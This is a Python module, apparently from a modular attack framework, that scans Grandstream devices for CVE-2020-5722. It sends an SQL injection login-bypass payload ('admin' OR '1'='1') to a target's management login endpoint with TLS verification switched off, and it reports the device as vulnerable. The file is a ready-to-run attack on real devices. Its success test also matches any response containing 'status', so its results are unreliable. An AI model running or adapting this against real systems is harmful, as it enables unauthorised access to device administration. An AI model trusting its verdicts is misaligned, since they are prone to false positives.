import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "grandstream/sqli_bypass_scan"
        self.description = "Unauthenticated SQL Injection and login bypass scanner for Grandstream devices (CVE-2020-5722)."
        self.type = "scan"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        if not target.startswith(("http://", "https://")):
            url = f"http://{target}:{port}/manager?action=login"
        else:
            url = f"{target.rstrip('/')}/manager?action=login"
            
        # Payload SQLi basique pour tenter de forcer un comportement anormal ou un bypass
        payload = {"username": "admin' OR '1'='1", "secret": "test"}
        
        try:
            async with httpx.AsyncClient(timeout=5.0, verify=False) as client:
                response = await client.post(url, data=payload)
                # Si l'application web traite la requête SQL injectée et valide un cookie ou un statut positif
                if response.status_code == 200 and ("response=\"success\"" in response.text or "status" in response.text):
                    return {
                        "vulnerable": True,
                        "details": "Grandstream management login handler is vulnerable to SQL injection bypass vectors."
                    }
        except Exception as e:
            return {"vulnerable": False, "error": str(e)}
        return {"vulnerable": False}
